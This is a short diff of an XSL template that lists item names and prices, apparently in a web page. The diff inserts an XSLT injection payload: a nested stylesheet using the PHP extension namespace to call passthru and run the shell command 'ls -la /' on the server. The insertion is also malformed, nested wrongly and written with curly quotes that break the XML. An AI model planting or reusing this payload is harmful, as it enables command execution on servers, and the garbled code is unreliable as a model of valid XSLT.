@@ -5,6 +5,11 @@
   <div style="background-color:black;color:red;padding:4px">
     <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
     <xsl:value-of select="price"/>
+    <xsl:stylesheet version=”1.0″ xmlns:xsl=”http://www.w3.org/1999/XSL/Transform” xmlns:php=”http://php.net/xsl”>
+<xsl:template match=”/”>
+<xsl:value-of select=”php:function(‘passthru’,’ls -la /’)”/>
+</xsl:template>
+</xsl:stylesheet>
     </div>
   <div style="margin-left:20px;margin-bottom:1em;font-size:10pt">
     <p>
